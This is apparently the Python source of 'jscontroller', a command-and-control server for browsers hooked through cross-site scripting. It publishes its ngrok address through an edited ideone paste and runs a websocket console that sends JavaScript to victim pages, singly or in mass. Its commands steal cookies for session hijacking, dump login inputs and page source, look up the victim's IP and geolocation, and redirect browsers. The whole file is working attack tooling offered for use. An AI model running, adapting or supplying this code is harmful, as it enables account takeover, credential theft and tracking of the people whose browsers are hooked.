import signal, sys
sys.path.append('.')
import time
import os
import websockets
import asyncio
import threading
import click
import pyperclip
from urllib.parse import urlparse
from requests import get,post

stopFlag = False

config_path = "config.json"
config_json = eval(open(config_path,"r").read())

user = config_json["username"]
passwd = config_json["password"]
link = config_json["link"]

def ideone_login():
  try:
    dt = {'username':user,'password':passwd,'remember':'yes','next':'L29EOXp1Yw=='}
    head = {"User-Agent":"Mozilla/5.0"}
    res = post(url="https://ideone.com/account/login",headers=head,data=dt,allow_redirects=False)
    if res.status_code != 302:
      print("Error: wrong password in config.json!")
      exit()
    else:
      return res.cookies.get_dict()
  except Exception as e:
    print(e)

def ideone_edit(ngrok_beef_url):
  try:
    print("[*] Editing ideone url ...")
    ideone_cookies = ideone_login()
    dt = {'input':'','source':ngrok_beef_url,'link':link,'only_save':'false'}
    head = {"User-Agent":"Mozilla/5.0"}
    res = post(url="https://ideone.com/submitedit",headers=head,cookies=ideone_cookies,data=dt)
    resjson = eval(res.text)
    if resjson["status"] == "ok":
      print("[+] Ideone edited as success. jscontroller clients will connect soo.")
    else:
      print(resjson)
      print("Error while edit ideone file")
      exit()
  except Exception as e:
    print(e)

def ngrok_get_url():
  try:
    res = get(url="http://127.0.0.1:4040/api/tunnels/command_line")
    true = True
    false = False
    resjson = eval(res.text)
    public_url = resjson["public_url"]
    return public_url
  except Exception as e:
    print(e)
    print("[!] ERROR: Ngrok are not running HTTP tunnel. Please, start it.")
    exit()

ngrok_url = ngrok_get_url()
ideone_edit(ngrok_url.split(".")[0].replace("https://",""))


def helpar():
  print("\n============	DOCUMENT COMMANDS =============")
  print("domain				Get actual page domain")
  print("cookie				Get actual page cookie")
  print("url				Get actual page url")
  print("title				Get actual page title")
  print("location <url>			Redirect client to other URL")
  print("\n============== NAVIGATOR COMMANDS =============")
  print("ua				Return browser user agent")
  print("language			Return browser language")
  print("platform			Return browser platform")
  print("java				Return if java is installed")
  print("\n============ OTHERS COMMANDS ================")
  #print("screenshot [url]		Take a screenshot of current page or seted url") # usar metodo do 12 xss exploits mesmo
  print("geolocation			Return client geolocation")
  print("ip				Return client IP address")
  print("passdump [url]			Dump logins and passwords (inputs) of a page ")
  print("source [url]			Dump source code of current or seted page (ex: source /account)")
  #print("cookie-hijacking		Peforme a cookie hijacking attack")
  print("\n============ JSCONTROLLER ===================")
  print("sessions [id]			Print sessions, current session or change")
  print("mass true/false/status		Send commands massively")
  print("verbose true/false		Verbose new connections. default: true")
  print("clear				Clear the screen")
  print("autorun command1,command2	Run a command(s) after a connection be estabilized. Ex: (autorun: geolocation)")
  print("\n")

class MSGWorker (threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)
    self.sessions = {}
    self.sid = 1
    self.cont = 1
    self.mass = False
    self.verbose = True
    self.x = None
    self.alias = {
    "domain":"envia(document.domain)",
    "cookie":"envia(document.cookie)",
    "url":"envia(document.documentURI)",
    "title":"envia(document.title)",
    "ua":"envia(navigator.userAgent)",
    "language":"envia(navigator.language)",
    "platform":"envia(navigator.platform)",
    "java":"envia(navigator.javaEnabled())",
    "ip":"txt = fetch('https://ifconfig.me/ip').then(response => response.text()).then(data => {envia(data)})",
     "source":"""envia("{'s0urc3dUmp1aWFoaWhoc2':\\"\\"\\""+unescape(encodeURIComponent(document.documentElement.outerHTML))+"\\"\\"\\"}")""",
     'session-hijacking':'envia(JSON.stringify({"session-hijacking":document.cookie}))'}


  def run(self):
    while not stopFlag:
      self.x = input("JSController> ")
      x = self.x
      if x in ["help","options","?"]:
        helpar()
        continue
      elif x in [""," ",False]:
        continue

      elif x.split(" ")[0] == "location" and len(x.split(" ")) == 2:
        print("locating to url",x.split(" ").pop())
        x = f'window.location.href="{x.split().pop()}"'

      elif x == "geolocation":
        x = open("payloads/geolocation.txt","r").read()

      elif x.split(" ")[0] == "source" and len(x.split(" ")) > 1:
        x = open("payloads/sourcedump.txt","r").read().replace("<repl4ce>",x.split(" ")[1])

      elif x == "screenshot":
        x = open("payloads/screenshot.txt").read()

      elif x.split(" ")[0] == "sessions":
        if len(self.sessions) == 0:
          print("No openned session")
          continue
        print("Current session:",self.sid)
        if len(x.split(" ")) == 1:
          for s in self.sessions:
            try:
              print(f"Session id: {s} url: {self.sessions[s][1]}  |  ip: {self.sessions[s][3]}")
            except:
              None
        elif len(x.split(" ")) == 2:
          if x.split(" ")[1]+":" in str(self.sessions):
            print("Changing to session",x.split(" ")[1])
            self.sid = int(x.split(" ")[1])
          else:
            print("Session not found")
        continue
      elif x.split(" ")[0] == "mass":
        if len(x.split(" ")) == 1:
          print("Send commands massively:",self.mass)
        elif len(x.split(" ")) == 2:
          if x.split(" ")[1] in ["true","false","status"]:
            if x.split(" ")[1] == "true":
              self.mass = True
            elif x.split(" ")[1] == "false":
              self.mass = False
            elif x.split(" ")[1] == "status":
              print("Send commands massively:",self.mass)
            else:
              helpar()
          else:
            helpar()
        else:
          helpar()
        continue

      elif x.split(" ")[0] == "verbose":
        if len(x.split(" ")) == 1:
          print("verbose:",self.verbose)
        elif len(x.split(" ")) == 2:
          if x.split(" ")[1] in ["true","false"]:
            if x.split(" ")[1] == "true":
              self.verbose = True
            elif x.split(" ")[1] == "false":
              self.verbose = False
            else:
              helpar()
        continue
      elif x in ["clear","cls"]:
        click.clear()
        continue
      elif x in self.alias:
        x = self.alias[x]
      print(x)
      if len(self.sessions) != 0:
        if self.mass == True:
          if len(self.sessions) != 0:
            self.sendMass(x)
        else:
          self.sendData(x)
        time.sleep(1)
      else:
        print("No openned session")


  async def handler(self, websocket, path):
    if len(self.sessions) == 0:
      if self.cont != 1:
        print("Changed to session:",self.cont)
      self.sid = self.cont
    coro = websocket.send("txt = fetch('https://ifconfig.me/ip').then(response => response.text()).then(data => {envia(document.documentURI+'.|.'+data)})")
    future = asyncio.run_coroutine_threadsafe(coro, loop)

    first_msg = await websocket.recv()
    first_msg = first_msg.split(".|.")
    self.sessions[self.cont] = [websocket,first_msg[0],self.cont,first_msg[1]]
    h_id = self.cont
    self.cont += 1
    if self.verbose == True:
      print(f"[+] Session {h_id} openned on url: {first_msg[0]}  |  ip: {first_msg[1]}\nJSController> ",end="");

    try:
      while 1:
        try:
          msg = await websocket.recv()
          if "geol0cat10n_Latitude:" in msg and "geol0cat10n_Longitude:" in msg:
            lati = msg.replace("\n",": ").split(": ")[1]
            longi = msg.replace("\n",": ").split(": ")[3]
            print("[*] See: https://www.google.com/maps/place/"+lati+"+"+longi)
          elif "s0urc3dUmp1aWFoaWhoc2" in msg:
            try:
              sourcehtml = eval(msg)["s0urc3dUmp1aWFoaWhoc2"]
              sourcehtml = sourcehtml.replace('src="/',f'src="{urlparse(self.sessions[self.sid][1]).scheme+"://"+urlparse(self.sessions[self.sid][1]).netloc}/')
              sourcehtml = sourcehtml.replace("src='/",f"src='{urlparse(self.sessions[self.sid][1]).scheme+'://'+urlparse(self.sessions[self.sid][1]).netloc}/")

              sourcehtml = sourcehtml.replace('href="/',f'href="{urlparse(self.sessions[self.sid][1]).scheme+"://"+urlparse(self.sessions[self.sid][1]).netloc}/')
              sourcehtml = sourcehtml.replace("href='/",f"href='{urlparse(self.sessions[self.sid][1]).scheme+'://'+urlparse(self.sessions[self.sid][1]).netloc}/")
              timestr = time.strftime("%Y-%m-%d-%H%M%S")
              with open("sourcedump/html_"+timestr+".html","w") as f:
                f.write(sourcehtml)
                f.close()
                opensourceyn = input(f"[*] sourcode html saved in: {'sourcedump/html_'+timestr+'.html'} Do you want open?[Y/n]: ")
                if opensourceyn in ["Y","y",""," "]:
                  print(f'[*] Opening {"sourcedump/html_"+timestr+".html"} ...')
                  os.system(f'firefox --private-window {"sourcedump/html_"+timestr+".html"}')
                  time.sleep(3)
                  print("JSController> ",end="")
            except Exception as e:
              print(msg)
              print(e)
            except Exception as e:
              print(e)

          else:
            print(msg)
        except:
          if len(self.sessions) == 0:
            print("waiting new connections ...\n JSController> ",end="")
            return

          if self.sid != h_id:
            del self.sessions[h_id]
            if self.verbose:
              print(f"\nsession {h_id} closed(up)\nJSController> ",end="")
            return
          del self.sessions[h_id]

          if self.verbose:
            print(f"\nsession {h_id} closed (upd)")
          for a in range(0,999):
            if a in self.sessions:
              self.sid = a
              if self.verbose:
                print("changed to session(up):",str(a)+"\nJSController> ",end="")
              return
          return
    except:
      if self.sid != h_id:
        del self.sessions[h_id]
        if self.verbose:
          print(f"\nsession {h_id} closed\nJSController> ",end="")
        return

      del self.sessions[h_id]
      if self.verbose:
        print(f"\nsession {h_id} closed")
      if len(self.sessions) == 0:
        print("waiting new connections ...")
        return
      for a in range(0,999):
        if a in self.sessions:
          self.sid = a
          if self.verbose:
            print("changed to session:",str(a)+"\nJSController> ")
          return

      if self.verbose:
        print("JSController> ")

  def sendData(self,data):
    coro = self.sessions[self.sid][0].send(data)
    future = asyncio.run_coroutine_threadsafe(coro, loop)

  def sendMass(self,data):
    for mass_id in self.sessions:
      coro = self.sessions[mass_id][0].send(data)
      future = asyncio.run_coroutine_threadsafe(coro, loop)


if __name__ == "__main__":
  print("""
     ██╗███████╗ ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗     ██╗     ███████╗██████╗ 
     ██║██╔════╝██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║     ██║     ██╔════╝██╔══██╗
     ██║███████╗██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║     ██║     █████╗  ██████╔╝
██   ██║╚════██║██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║     ██║     ██╔══╝  ██╔══██╗
╚█████╔╝███████║╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗███████╗███████╗██║  ██║
 ╚════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                             jscontroller v1.0 by github.com/f1gur4nt

  """)


  msgWorker = MSGWorker()

  try:
    msgWorker.start()

    ws_server = websockets.serve(msgWorker.handler, '0.0.0.0', 8080)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(ws_server)
    loop.run_forever()
  except KeyboardInterrupt:
    stopFlag = True
    print("Exiting program...")
